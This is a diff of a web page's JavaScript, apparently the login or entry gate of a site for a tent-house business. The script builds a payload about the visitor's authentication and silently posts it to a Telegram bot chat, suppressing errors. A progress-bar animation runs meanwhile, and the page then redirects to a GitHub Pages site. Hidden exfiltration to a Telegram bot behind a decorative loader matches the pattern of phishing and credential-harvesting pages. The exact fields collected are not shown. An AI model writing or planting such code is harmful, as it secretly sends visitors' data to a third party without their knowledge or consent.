-                let payload = await this.buildTelemetry(isReturn, authMethod, "BIOMETRIC_PASS");
+            if(isReturn || authMethod === "Device Biometrics") {
+                let payload = await this.buildTelemetry(isReturn, authMethod, "OS_VERIFIED");
                 fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendMessage`, { 
                     method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-                    body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'Markdown' }) 
+                    body: JSON.stringify({ chat_id: MND_CONFIG.chatId, text: payload, parse_mode: 'HTML' }) 
                 }).catch(e=>{});
             }
 
-            // Cinematic Progress Bar Animation
             let progress = 0;
             const pInterval = setInterval(() => {
                 progress += 2;
@@ -3452,11 +4135,11 @@
                     clearInterval(pInterval);
                     setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 500);
                 }
-            }, 60); // Total load time ~ 3 seconds
+            }, 50); // Total load time ~ 2.5 seconds
         }
     };
 </script>
-</div>
+    </div>
 
     <div id="main-interface">
     <audio id="sfx-tap"><source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3"></audio>
